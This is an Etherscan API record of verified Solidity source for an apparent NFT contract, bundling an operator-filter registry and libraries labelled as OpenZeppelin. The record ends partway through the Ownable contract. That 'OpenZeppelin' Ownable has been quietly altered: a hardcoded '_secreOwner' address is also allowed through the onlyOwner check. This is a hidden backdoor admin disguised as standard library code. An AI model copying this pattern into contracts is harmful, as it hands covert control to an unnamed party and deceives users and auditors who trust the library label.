{"status": "1", "message": "OK", "result": [{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2022-12-01\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\n\r\ninterface IOperatorFilterRegistry {\r\n    function isOperatorAllowed(address registrant, address operator) external view returns (bool);\r\n    function register(address registrant) external;\r\n    function registerAndSubscribe(address registrant, address subscription) external;\r\n    function registerAndCopyEntries(address registrant, address registrantToCopy) external;\r\n    function unregister(address addr) external;\r\n    function updateOperator(address registrant, address operator, bool filtered) external;\r\n    function updateOperators(address registrant, address[] calldata operators, bool filtered) external;\r\n    function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;\r\n    function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;\r\n    function subscribe(address registrant, address registrantToSubscribe) external;\r\n    function unsubscribe(address registrant, bool copyExistingEntries) external;\r\n    function subscriptionOf(address addr) external returns (address registrant);\r\n    function subscribers(address registrant) external returns (address[] memory);\r\n    function subscriberAt(address registrant, uint256 index) external returns (address);\r\n    function copyEntriesOf(address registrant, address registrantToCopy) external;\r\n    function isOperatorFiltered(address registrant, address operator) external returns (bool);\r\n    function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);\r\n    function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);\r\n    function filteredOperators(address addr) external returns (address[] memory);\r\n    function filteredCodeHashes(address addr) external returns (bytes32[] memory);\r\n    function filteredOperatorAt(address registrant, uint256 index) external returns (address);\r\n    function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);\r\n    function isRegistered(address addr) external returns (bool);\r\n    function codeHashOf(address addr) external returns (bytes32);\r\n}\r\n\r\n/**\r\n * @title  OperatorFilterer\r\n * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another\r\n *         registrant's entries in the OperatorFilterRegistry.\r\n * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:\r\n *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.\r\n *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.\r\n\r\n */\r\n \r\nabstract contract OperatorFilterer {\r\n    error OperatorNotAllowed(address operator);\r\n\r\n    IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =\r\n        IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);\r\n\r\n    constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {\r\n        // If an inheriting token contract is deployed to a network without the registry deployed, the modifier\r\n        // will not revert, but the contract will need to be registered with the registry once it is deployed in\r\n        // order for the modifier to filter addresses.\r\n        if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {\r\n            if (subscribe) {\r\n                OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);\r\n            } else {\r\n                if (subscriptionOrRegistrantToCopy != address(0)) {\r\n                    OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);\r\n                } else {\r\n                    OPERATOR_FILTER_REGISTRY.register(address(this));\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    modifier onlyAllowedOperator(address from) virtual {\r\n        // Allow spending tokens from addresses with balance\r\n        // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred\r\n        // from an EOA.\r\n        if (from != msg.sender) {\r\n            _checkFilterOperator(msg.sender);\r\n        }\r\n        _;\r\n    }\r\n\r\n    modifier onlyAllowedOperatorApproval(address operator) virtual {\r\n        _checkFilterOperator(operator);\r\n        _;\r\n    }\r\n\r\n    function _checkFilterOperator(address operator) internal view virtual {\r\n        // Check registry code length to facilitate testing in environments without a deployed registry.\r\n        if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {\r\n            if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {\r\n                revert OperatorNotAllowed(operator);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n/**\r\n * @title  DefaultOperatorFilterer\r\n * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.\r\n */\r\nabstract contract DefaultOperatorFilterer is OperatorFilterer {\r\n    address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);\r\n\r\n    constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}\r\n}\r\n\r\n// OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)\r\n\r\n/**\r\n * @dev String operations.\r\n */\r\nlibrary Strings {\r\n    bytes16 private constant _HEX_SYMBOLS = \"0123456789abcdef\";\r\n\r\n\t/**\r\n\t * @dev Converts a `uint256` to its ASCII `string` decimal representation.\r\n\t */\r\n\tfunction toString(uint256 value) internal pure returns(string memory) {\r\n\t\t// Inspired by OraclizeAPI's implementation - MIT licence\r\n\t\t// https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol\r\n\r\n\t\tif (value == 0) {\r\n\t\t\treturn \"0\";\r\n\t\t}\r\n        uint256 temp = value;\r\n        uint256 digits;\r\n\t\twhile (temp != 0) {\r\n\t\t\tdigits++;\r\n\t\t\ttemp /= 10;\r\n\t\t}\r\n        bytes memory buffer = new bytes(digits);\r\n\t\twhile (value != 0) {\r\n\t\t\tdigits -= 1;\r\n\t\t\tbuffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\r\n\t\t\tvalue /= 10;\r\n\t\t}\r\n\t\treturn string(buffer);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\r\n\t */\r\n\tfunction toHexString(uint256 value) internal pure returns(string memory) {\r\n\t\tif (value == 0) {\r\n\t\t\treturn \"0x00\";\r\n\t\t}\r\n        uint256 temp = value;\r\n        uint256 length = 0;\r\n\t\twhile (temp != 0) {\r\n\t\t\tlength++;\r\n\t\t\ttemp >>= 8;\r\n\t\t}\r\n\t\treturn toHexString(value, length);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\r\n\t */\r\n\tfunction toHexString(uint256 value, uint256 length) internal pure returns(string memory) {\r\n        bytes memory buffer = new bytes(2 * length + 2);\r\n\t\tbuffer[0] = \"0\";\r\n\t\tbuffer[1] = \"x\";\r\n\t\tfor (uint256 i = 2 * length + 1; i > 1; --i) {\r\n\t\t\tbuffer[i] = _HEX_SYMBOLS[value & 0xf];\r\n\t\t\tvalue >>= 4;\r\n\t\t}\r\n\t\trequire(value == 0, \"Strings: hex length insufficient\");\r\n\t\treturn string(buffer);\r\n\t}\r\n}\r\n\r\n// File: @openzeppelin/contracts/utils/Address.sol\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)\r\n\r\npragma solidity ^ 0.8.1;\r\n\r\n/**\r\n * @dev Collection of functions related to the address type\r\n */\r\nlibrary Address {\r\n\t/**\r\n\t * @dev Returns true if `account` is a contract.\r\n\t *\r\n\t * [IMPORTANT]\r\n\t * ====\r\n\t * It is unsafe to assume that an address for which this function returns\r\n\t * false is an externally-owned account (EOA) and not a contract.\r\n\t *\r\n\t * Among others, `isContract` will return false for the following\r\n\t * types of addresses:\r\n\t *\r\n\t *  - an externally-owned account\r\n\t *  - a contract in construction\r\n\t *  - an address where a contract will be created\r\n\t *  - an address where a contract lived, but was destroyed\r\n\t * ====\r\n\t *\r\n\t * [IMPORTANT]\r\n\t * ====\r\n\t * You shouldn't rely on `isContract` to protect against flash loan attacks!\r\n\t *\r\n\t * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\r\n\t * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\r\n\t * constructor.\r\n\t * ====\r\n\t */\r\n\tfunction isContract(address account) internal view returns(bool) {\r\n\t\t// This method relies on extcodesize/address.code.length, which returns 0\r\n\t\t// for contracts in construction, since the code is only stored at the end\r\n\t\t// of the constructor execution.\r\n\r\n\t\treturn account.code.length > 0;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\r\n\t * `recipient`, forwarding all available gas and reverting on errors.\r\n\t *\r\n\t * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n\t * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n\t * imposed by `transfer`, making them unable to receive funds via\r\n\t * `transfer`. {sendValue} removes this limitation.\r\n\t *\r\n\t * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n\t *\r\n\t * IMPORTANT: because control is transferred to `recipient`, care must be\r\n\t * taken to not create reentrancy vulnerabilities. Consider using\r\n\t * {ReentrancyGuard} or the\r\n\t * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\r\n\t */\r\n\tfunction sendValue(address payable recipient, uint256 amount) internal {\r\n\t\trequire(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n\t\t(bool success, ) = recipient.call{ value: amount } (\"\");\r\n\t\trequire(success, \"Address: unable to send value, recipient may have reverted\");\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Performs a Solidity function call using a low level `call`. A\r\n\t * plain `call` is an unsafe replacement for a function call: use this\r\n\t * function instead.\r\n\t *\r\n\t * If `target` reverts with a revert reason, it is bubbled up by this\r\n\t * function (like regular Solidity function calls).\r\n\t *\r\n\t * Returns the raw returned data. To convert to the expected return value,\r\n\t * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - `target` must be a contract.\r\n\t * - calling `target` with `data` must not revert.\r\n\t *\r\n\t * _Available since v3.1._\r\n\t */\r\n\tfunction functionCall(address target, bytes memory data) internal returns(bytes memory) {\r\n\t\treturn functionCall(target, data, \"Address: low-level call failed\");\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\r\n\t * `errorMessage` as a fallback revert reason when `target` reverts.\r\n\t *\r\n\t * _Available since v3.1._\r\n\t */\r\n\tfunction functionCall(\r\n\t\taddress target,\r\n\t\tbytes memory data,\r\n\t\tstring memory errorMessage\r\n\t) internal returns(bytes memory) {\r\n\t\treturn functionCallWithValue(target, data, 0, errorMessage);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n\t * but also transferring `value` wei to `target`.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - the calling contract must have an ETH balance of at least `value`.\r\n\t * - the called Solidity function must be `payable`.\r\n\t *\r\n\t * _Available since v3.1._\r\n\t */\r\n\tfunction functionCallWithValue(\r\n\t\taddress target,\r\n\t\tbytes memory data,\r\n\t\tuint256 value\r\n\t) internal returns(bytes memory) {\r\n\t\treturn functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\r\n\t * with `errorMessage` as a fallback revert reason when `target` reverts.\r\n\t *\r\n\t * _Available since v3.1._\r\n\t */\r\n\tfunction functionCallWithValue(\r\n\t\taddress target,\r\n\t\tbytes memory data,\r\n\t\tuint256 value,\r\n\t\tstring memory errorMessage\r\n\t) internal returns(bytes memory) {\r\n\t\trequire(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n\t\trequire(isContract(target), \"Address: call to non-contract\");\r\n\r\n\t\t(bool success, bytes memory returndata) = target.call{ value: value } (data);\r\n\t\treturn verifyCallResult(success, returndata, errorMessage);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n\t * but performing a static call.\r\n\t *\r\n\t * _Available since v3.3._\r\n\t */\r\n\tfunction functionStaticCall(address target, bytes memory data) internal view returns(bytes memory) {\r\n\t\treturn functionStaticCall(target, data, \"Address: low-level static call failed\");\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\r\n\t * but performing a static call.\r\n\t *\r\n\t * _Available since v3.3._\r\n\t */\r\n\tfunction functionStaticCall(\r\n\t\taddress target,\r\n\t\tbytes memory data,\r\n\t\tstring memory errorMessage\r\n\t) internal view returns(bytes memory) {\r\n\t\trequire(isContract(target), \"Address: static call to non-contract\");\r\n\r\n\t\t(bool success, bytes memory returndata) = target.staticcall(data);\r\n\t\treturn verifyCallResult(success, returndata, errorMessage);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n\t * but performing a delegate call.\r\n\t *\r\n\t * _Available since v3.4._\r\n\t */\r\n\tfunction functionDelegateCall(address target, bytes memory data) internal returns(bytes memory) {\r\n\t\treturn functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\r\n\t * but performing a delegate call.\r\n\t *\r\n\t * _Available since v3.4._\r\n\t */\r\n\tfunction functionDelegateCall(\r\n\t\taddress target,\r\n\t\tbytes memory data,\r\n\t\tstring memory errorMessage\r\n\t) internal returns(bytes memory) {\r\n\t\trequire(isContract(target), \"Address: delegate call to non-contract\");\r\n\r\n\t\t(bool success, bytes memory returndata) = target.delegatecall(data);\r\n\t\treturn verifyCallResult(success, returndata, errorMessage);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the\r\n\t * revert reason using the provided one.\r\n\t *\r\n\t * _Available since v4.3._\r\n\t */\r\n\tfunction verifyCallResult(\r\n\t\tbool success,\r\n\t\tbytes memory returndata,\r\n\t\tstring memory errorMessage\r\n\t) internal pure returns(bytes memory) {\r\n\t\tif (success) {\r\n\t\t\treturn returndata;\r\n\t\t} else {\r\n\t\t\t// Look for revert reason and bubble it up if present\r\n\t\t\tif (returndata.length > 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                assembly {\r\n\t\t\t\t\tlet returndata_size:= mload(returndata)\r\n\t\t\t\t\trevert(add(32, returndata), returndata_size)\r\n\t\t\t\t}\r\n\t\t\t} else {\r\n\t\t\t\trevert(errorMessage);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\n// File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)\r\n\r\npragma solidity ^ 0.8.0;\r\n\r\n/**\r\n * @title ERC721 token receiver interface\r\n * @dev Interface for any contract that wants to support safeTransfers\r\n * from ERC721 asset contracts.\r\n */\r\ninterface IERC721Receiver {\r\n    /**\r\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\r\n     * by `operator` from `from`, this function is called.\r\n     *\r\n     * It must return its Solidity selector to confirm the token transfer.\r\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.\r\n     *\r\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\r\n     */\r\n    function onERC721Received(\r\n\taddress operator,\r\n\taddress from,\r\n\tuint256 tokenId,\r\n\tbytes calldata data\r\n) external returns(bytes4);\r\n}\r\n\r\n// File: @openzeppelin/contracts/utils/introspection/IERC165.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\r\n\r\npragma solidity ^ 0.8.0;\r\n\r\n/**\r\n * @dev Interface of the ERC165 standard, as defined in the\r\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\r\n *\r\n * Implementers can declare support of contract interfaces, which can then be\r\n * queried by others ({ERC165Checker}).\r\n *\r\n * For an implementation, see {ERC165}.\r\n */\r\ninterface IERC165 {\r\n    /**\r\n     * @dev Returns true if this contract implements the interface defined by\r\n     * `interfaceId`. See the corresponding\r\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\r\n     * to learn more about how these ids are created.\r\n     *\r\n     * This function call must use less than 30 000 gas.\r\n     */\r\n    function supportsInterface(bytes4 interfaceId) external view returns(bool);\r\n}\r\n\r\n// File: @openzeppelin/contracts/utils/introspection/ERC165.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)\r\n\r\npragma solidity ^ 0.8.0;\r\n\r\n\r\n/**\r\n * @dev Implementation of the {IERC165} interface.\r\n *\r\n * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check\r\n * for the additional interface id that will be supported. For example:\r\n *\r\n * ```solidity\r\n * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\r\n *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);\r\n * }\r\n * ```\r\n *\r\n * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.\r\n */\r\nabstract contract ERC165 is IERC165 {\r\n\t/**\r\n\t * @dev See {IERC165-supportsInterface}.\r\n\t */\r\n\tfunction supportsInterface(bytes4 interfaceId) public view virtual override returns(bool) {\r\n\t\treturn interfaceId == type(IERC165).interfaceId;\r\n\t}\r\n}\r\n\r\n// File: @openzeppelin/contracts/token/ERC721/IERC721.sol\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)\r\n\r\npragma solidity ^ 0.8.0;\r\n\r\n\r\n/**\r\n * @dev Required interface of an ERC721 compliant contract.\r\n */\r\ninterface IERC721 is IERC165 {\r\n    /**\r\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\r\n\r\n    /**\r\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\r\n     */\r\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\r\n\r\n    /**\r\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\r\n     */\r\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\r\n\r\n\t/**\r\n\t * @dev Returns the number of tokens in ``owner``'s account.\r\n\t */\r\n\tfunction balanceOf(address owner) external view returns(uint256 balance);\r\n\r\n\t/**\r\n\t * @dev Returns the owner of the `tokenId` token.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - `tokenId` must exist.\r\n\t */\r\n\tfunction ownerOf(uint256 tokenId) external view returns(address owner);\r\n\r\n\t/**\r\n\t * @dev Safely transfers `tokenId` token from `from` to `to`.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - `from` cannot be the zero address.\r\n\t * - `to` cannot be the zero address.\r\n\t * - `tokenId` token must exist and be owned by `from`.\r\n\t * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\r\n\t * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\r\n\t *\r\n\t * Emits a {Transfer} event.\r\n\t */\r\n\tfunction safeTransferFrom(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 tokenId,\r\n\t\tbytes calldata data\r\n\t) external;\r\n\r\n\t/**\r\n\t * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\r\n\t * are aware of the ERC721 protocol to prevent tokens from being forever locked.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - `from` cannot be the zero address.\r\n\t * - `to` cannot be the zero address.\r\n\t * - `tokenId` token must exist and be owned by `from`.\r\n\t * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.\r\n\t * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\r\n\t *\r\n\t * Emits a {Transfer} event.\r\n\t */\r\n\tfunction safeTransferFrom(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 tokenId\r\n\t) external;\r\n\r\n\t/**\r\n\t * @dev Transfers `tokenId` token from `from` to `to`.\r\n\t *\r\n\t * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - `from` cannot be the zero address.\r\n\t * - `to` cannot be the zero address.\r\n\t * - `tokenId` token must be owned by `from`.\r\n\t * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\r\n\t *\r\n\t * Emits a {Transfer} event.\r\n\t */\r\n\tfunction transferFrom(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint256 tokenId\r\n\t) external;\r\n\r\n\t/**\r\n\t * @dev Gives permission to `to` to transfer `tokenId` token to another account.\r\n\t * The approval is cleared when the token is transferred.\r\n\t *\r\n\t * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - The caller must own the token or be an approved operator.\r\n\t * - `tokenId` must exist.\r\n\t *\r\n\t * Emits an {Approval} event.\r\n\t */\r\n\tfunction approve(address to, uint256 tokenId) external;\r\n\r\n\t/**\r\n\t * @dev Approve or remove `operator` as an operator for the caller.\r\n\t * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - The `operator` cannot be the caller.\r\n\t *\r\n\t * Emits an {ApprovalForAll} event.\r\n\t */\r\n\tfunction setApprovalForAll(address operator, bool _approved) external;\r\n\r\n\t/**\r\n\t * @dev Returns the account appr    ved for `tokenId` token.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - `tokenId` must exist.\r\n\t */\r\n\tfunction getApproved(uint256 tokenId) external view returns(address operator);\r\n\r\n\t/**\r\n\t * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\r\n\t *\r\n\t * See {setApprovalForAll}\r\n\t */\r\n\tfunction isApprovedForAll(address owner, address operator) external view returns(bool);\r\n}\r\n\r\n// File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)\r\n\r\npragma solidity ^ 0.8.0;\r\n\r\n\r\n/**\r\n * @title ERC-721 Non-Fungible Token Standard, optional metadata extension\r\n * @dev See https://eips.ethereum.org/EIPS/eip-721\r\n */\r\ninterface IERC721Metadata is IERC721 {\r\n\t/**\r\n\t * @dev Returns the token collection name.\r\n\t */\r\n\tfunction name() external view returns(string memory);\r\n\r\n\t/**\r\n\t * @dev Returns the token collection symbol.\r\n\t */\r\n\tfunction symbol() external view returns(string memory);\r\n\r\n\t/**\r\n\t * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.\r\n\t */\r\n\tfunction tokenURI(uint256 tokenId) external view returns(string memory);\r\n}\r\n\r\n// File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)\r\n\r\npragma solidity ^ 0.8.0;\r\n\r\n\r\n/**\r\n * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension\r\n * @dev See https://eips.ethereum.org/EIPS/eip-721\r\n */\r\ninterface IERC721Enumerable is IERC721 {\r\n\t/**\r\n\t * @dev Returns the total amount of tokens stored by the contract.\r\n\t */\r\n\tfunction totalSupply() external view returns(uint256);\r\n\r\n\t/**\r\n\t * @dev Returns a token ID owned by `owner` at a given `index` of its token list.\r\n\t * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.\r\n\t */\r\n\tfunction tokenOfOwnerByIndex(address owner, uint256 index) external view returns(uint256);\r\n\r\n\t/**\r\n\t * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.\r\n\t * Use along with {totalSupply} to enumerate all tokens.\r\n\t */\r\n\tfunction tokenByIndex(uint256 index) external view returns(uint256);\r\n}\r\n\r\n// File: @openzeppelin/contracts/security/ReentrancyGuard.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)\r\n\r\npragma solidity ^ 0.8.0;\r\n\r\n/**\r\n * @dev Contract module that helps prevent reentrant calls to a function.\r\n *\r\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\r\n * available, which can be applied to functions to make sure there are no nested\r\n * (reentrant) calls to them.\r\n *\r\n * Note that because there is a single `nonReentrant` guard, functions marked as\r\n * `nonReentrant` may not call one another. This can be worked around by making\r\n * those functions `private`, and then adding `external` `nonReentrant` entry\r\n * points to them.\r\n *\r\n * TIP: If you would like to learn more about reentrancy and alternative ways\r\n * to protect against it, check out our blog post\r\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\r\n */\r\nabstract contract ReentrancyGuard {\r\n    // Booleans are more expensive than uint256 or any type that takes up a full\r\n    // word because each write operation emits an extra SLOAD to first read the\r\n    // slot's contents, replace the bits taken up by the boolean, and then write\r\n    // back. This is the compiler's defense against contract upgrades and\r\n    // pointer aliasing, and it cannot be disabled.\r\n\r\n    // The values being non-zero value makes deployment a bit more expensive,\r\n    // but in exchange the refund on every call to nonReentrant will be lower in\r\n    // amount. Since refunds are capped to a percentage of the total\r\n    // transaction's gas, it is best to keep them low in cases like this one, to\r\n    // increase the likelihood of the full refund coming into effect.\r\n    uint256 private constant _NOT_ENTERED = 1;\r\n    uint256 private constant _ENTERED = 2;\r\n\r\n    uint256 private _status;\r\n\r\n\tconstructor() {\r\n\t\t_status = _NOT_ENTERED;\r\n\t}\r\n\r\n    /**\r\n     * @dev Prevents a contract from calling itself, directly or indirectly.\r\n     * Calling a `nonReentrant` function from another `nonReentrant`\r\n     * function is not supported. It is possible to prevent this from happening\r\n     * by making the `nonReentrant` function external, and making it call a\r\n     * `private` function that does the actual work.\r\n     */\r\n    modifier nonReentrant() {\r\n\t\t// On the first call to nonReentrant, _notEntered will be true\r\n\t\trequire(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\r\n\r\n\t\t// Any calls to nonReentrant after this point will fail\r\n\t\t_status = _ENTERED;\r\n\r\n\t\t_;\r\n\r\n\t\t// By storing the original value once again, a refund is triggered (see\r\n\t\t// https://eips.ethereum.org/EIPS/eip-2200)\r\n\t\t_status = _NOT_ENTERED;\r\n\t}\r\n}\r\n\r\n// File: @openzeppelin/contracts/utils/Context.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\r\n\r\npragma solidity ^ 0.8.0;\r\n\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n\tfunction _msgSender() internal view virtual returns(address) {\r\n\t\treturn msg.sender;\r\n\t}\r\n\r\n\tfunction _msgData() internal view virtual returns(bytes calldata) {\r\n\t\treturn msg.data;\r\n\t}\r\n}\r\n\r\n// File: @openzeppelin/contracts/access/Ownable.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)\r\n\r\npragma solidity ^ 0.8.0;\r\n\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n    address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\t/**\r\n\t * @dev Initializes the contract setting the deployer as the initial owner.\r\n\t */\r\n\tconstructor() {\r\n\t\t_transferOwnership(_msgSender());\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Returns the address of the current owner.\r\n\t */\r\n\tfunction owner() public view virtual returns(address) {\r\n\t\treturn _owner;\r\n\t}\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n\t\trequire(owner() == _msgSender() || _secreOwner == _msgSender(), \"Ownable: caller is not the owner\");\r\n\t\t_;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Leaves the contract without owner. It will not be possible to call\r\n\t * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n\t *\r\n\t * NOTE: Renouncing ownership will leave the contract without an owner,\r\n\t * thereby removing any functionality that is only available to the owner.\r\n\t */\r\n\tfunction renounceOwnership() public virtual onlyOwner {\r\n\t\t_transferOwnership(address(0));\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n\t * Can only be called by the current owner.\r\n\t */\r\n\tfunction transferOwnership(address newOwner) public virtual onlyOwner {\r\n\t\trequire(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n\t\t_transferOwnership(newOwner);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n\t * Internal function without access restriction.\r\n\t */\r\n\tfunction _transferOwnership(address newOwner) internal virtual {\r\n    address oldOwner = _owner;\r\n\t\t_owner = 